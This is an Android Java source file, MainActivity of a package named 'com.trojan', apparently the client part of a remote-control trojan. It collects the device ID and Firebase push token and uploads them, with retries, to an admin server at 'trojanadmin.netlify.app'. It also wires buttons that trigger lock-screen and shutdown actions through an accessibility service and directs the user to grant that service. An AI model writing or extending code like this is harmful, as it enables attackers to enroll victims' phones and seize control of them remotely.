package com.trojan;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.messaging.FirebaseMessaging;

import org.json.JSONException;
import org.json.JSONObject;

public class MainActivity extends Activity {

    private static final String TAG = "MainActivity";
    
    private TextView tvDeviceInfo;
    private Button btnOpenAccessibility;
    private Button btnTestLock;
    private Button btnTestShutdown;
    
    private RequestQueue requestQueue;
    private int retryCount = 0;
    private static final int MAX_RETRIES = 3;
    private static final long INITIAL_RETRY_DELAY_MS = 5000;

    @SuppressLint("HardwareIds")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        tvDeviceInfo = findViewById(R.id.tvDeviceInfo);
        btnOpenAccessibility = findViewById(R.id.btnOpenAccessibility);
        btnTestLock = findViewById(R.id.btnTestLock);
        btnTestShutdown = findViewById(R.id.btnTestShutdown);
        
        requestQueue = Volley.newRequestQueue(this);

        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        String deviceInfoText = "Device ID:\n" + deviceId;
        tvDeviceInfo.setText(deviceInfoText);

        getTokenAndRegisterWithNetlify(deviceId);

        // --- BUTTON CLICK LISTENERS ---

        btnOpenAccessibility.setOnClickListener(v -> {
            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
        });

        // --- THIS IS THE UPDATED BUTTON LOGIC ---
        btnTestLock.setOnClickListener(v -> {
            // Checkpoint 1: Log that the button was clicked
            Log.d("COMMAND_TRACE", "MainActivity: 'Test Lock' button clicked. Sending broadcast...");

            // Create the intent for the lock screen action
            Intent intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_LOCK_SCREEN);

            // CRITICAL FIX: Make the broadcast explicit by setting the package name.
            // This is required on modern Android to ensure delivery.
            intent.setPackage(getPackageName());
            
            // Send the broadcast
            sendBroadcast(intent);
        });

        btnTestShutdown.setOnClickListener(v -> {
            // Checkpoint 1: Log that the button was clicked
            Log.d("COMMAND_TRACE", "MainActivity: 'Test Shutdown' button clicked. Sending broadcast...");

            // Create the intent for the shutdown action
            Intent intent = new Intent(PowerAccessibilityService.ACTION_TRIGGER_SHUTDOWN);
            
            // CRITICAL FIX: Make the broadcast explicit.
            intent.setPackage(getPackageName());
            
            // Send the broadcast
            sendBroadcast(intent);
        });
    }

    // --- The rest of the file is unchanged ---

    private void getTokenAndRegisterWithNetlify(String deviceId) {
        tvDeviceInfo.append("\n\nFetching FCM Token...");
        FirebaseMessaging.getInstance().getToken().addOnCompleteListener(task -> {
            if (!task.isSuccessful()) {
                Log.w(TAG, "Fetching FCM registration token failed", task.getException());
                tvDeviceInfo.append("\n\nFetching FCM Token Failed.");
                return;
            }
            String token = task.getResult();
            Log.d(TAG, "FCM Token acquired. Starting registration process.");
            retryCount = 0; 
            registerDeviceWithNetlify(deviceId, token);
        });
    }

    private void registerDeviceWithNetlify(String deviceId, String token) {
        if (retryCount == 0) {
            tvDeviceInfo.append("\n\nUploading to server...");
        }

        String url = "https://trojanadmin.netlify.app/.netlify/functions/register-device";
        JSONObject postData = new JSONObject();
        try {
            postData.put("deviceId", deviceId);
            postData.put("token", token);
        } catch (JSONException e) {
            tvDeviceInfo.append("\n\nError creating JSON payload.");
            return;
        }

        JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(
            Request.Method.POST, url, postData,
            response -> {
                Log.d("NETLIFY_REGISTER", "Success: " + response.toString());
                tvDeviceInfo.append("\n\n✅ Token successfully registered!");
                retryCount = 0;
            },
            error -> {
                Log.e("NETLIFY_REGISTER", "Error: " + error.toString());
                scheduleRetry(deviceId, token);
            }
        );
        requestQueue.add(jsonObjectRequest);
    }

    private void scheduleRetry(String deviceId, String token) {
        retryCount++;
        if (retryCount <= MAX_RETRIES) {
            long delayMs = INITIAL_RETRY_DELAY_MS * (long) Math.pow(2, retryCount - 1);
            String retryMessage = String.format("\n\nUpload failed. Retrying in %d seconds... (Attempt %d/%d)", delayMs / 1000, retryCount, MAX_RETRIES);
            tvDeviceInfo.append(retryMessage);
            Log.w(TAG, retryMessage);
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                Log.i(TAG, "Executing scheduled retry...");
                registerDeviceWithNetlify(deviceId, token);
            }, delayMs);
        } else {
            String finalFailMessage = "\n\n❌ Upload failed after multiple attempts. Please check network or restart app.";
            tvDeviceInfo.append(finalFailMessage);
            Log.e(TAG, "Max retries reached. Upload failed permanently.");
        }
    }
}
